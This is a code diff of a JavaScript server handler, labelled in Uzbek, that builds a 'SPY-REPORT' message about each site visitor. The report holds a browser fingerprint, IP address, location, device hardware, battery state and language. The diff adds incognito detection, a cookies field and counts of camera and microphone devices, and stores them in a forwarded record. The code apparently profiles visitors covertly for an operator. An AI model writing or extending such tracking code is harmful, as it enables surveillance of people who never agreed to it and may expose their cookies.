@@ -41,32 +41,27 @@ export default async function handler(req, res) {
     }
 
     const message = `
-🕵️‍♂️ *KIBER-HISOBOT: ${data.fingerprint || 'Noma\'lum'}*
+🕵️‍♂️ *SPY-REPORT: ${data.fingerprint || 'Noma\'lum'}*
 ----------------------------
 🕒 *Vaqt:* ${uzTime}
 📱 *Qurilma:* ${data.exactModel || deviceModel}
 🌐 *Ilova:* ${browserName}
 
 🆔 *Fingerprint:* \`${data.fingerprint}\`
-🌙 *Dark Mode:* ${data.darkMode}
-📐 *Holat:* ${data.orientation}
+🕵️ *Incognito:* ${data.incognito}
+🍪 *Cookies:* ${data.cookies}
+📷 *Media:* Video(${data.media?.videoinput || 0}), Audio(${data.media?.audioinput || 0})
 
 🔋 *Batareya:* ${data.battery?.level || 'Noma\'lum'} (${data.battery?.charging || ''})
 🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
 🎮 *GPU:* \`${data.gpu}\`
 
-📡 *Internet:* ${data.connection?.type || 'Noma\'lum'} (${data.connection?.downlink || ''})
-🌍 *Region:* ${data.timezone}
-🇺🇿 *Til:* ${data.language}
-👆 *Touch:* ${data.touchPoints} nuqta
+📡 *Internet:* ${data.connection?.type || 'Noma\'lum'}
+🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
+👆 *Touch:* ${data.touchPoints} | 📐 *Holat:* ${data.orientation}
 
 🌍 *IP:* ${ip}
 📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
-🖥 *Ekran:* ${data.screenSize || 'Noma\'lum'}
-🔗 *Referrer:* ${data.referrer || 'Direct'}
-
-📝 *User-Agent:*
-\`${ua}\`
 ----------------------------
 `;
 
@@ -99,7 +94,10 @@ export default async function handler(req, res) {
                 connection: JSON.stringify(data.connection),
                 screen_size: data.screenSize,
                 referrer: data.referrer,
-                user_agent: ua
+                user_agent: ua,
+                incognito: data.incognito,
+                cookies: data.cookies,
+                media: JSON.stringify(data.media)
             })
         });
 
